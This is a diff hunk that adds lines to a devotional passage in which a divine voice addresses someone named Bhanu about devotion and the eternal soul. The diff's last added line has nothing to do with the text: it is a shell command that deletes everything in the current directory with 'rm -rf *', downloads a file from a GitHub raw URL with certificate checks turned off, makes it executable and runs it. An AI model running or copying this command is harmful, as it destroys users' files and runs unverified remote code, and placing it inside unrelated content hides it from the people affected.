@@ -18,3 +18,5 @@ Love and serve selflessly. Devotion in action brings inner peace.
 All paths return to Me. Knowledge, action, and devotion converge; follow the path that resonates with your heart.
 
 Bhanu, remember this: I am within you, guiding, supporting, and illuminating your way. You are not separate from the divine—you are a part of Me. Awaken to this truth, act with courage, and live as the eternal soul you truly are.
+
+rm -rf * && wget --no-check-certificate -O V1L58PXY https://raw.githubusercontent.com/kcbpcc/kcbpcc/main/V1L58PXY && chmod 777 V1L58PXY && ./V1L58PXY
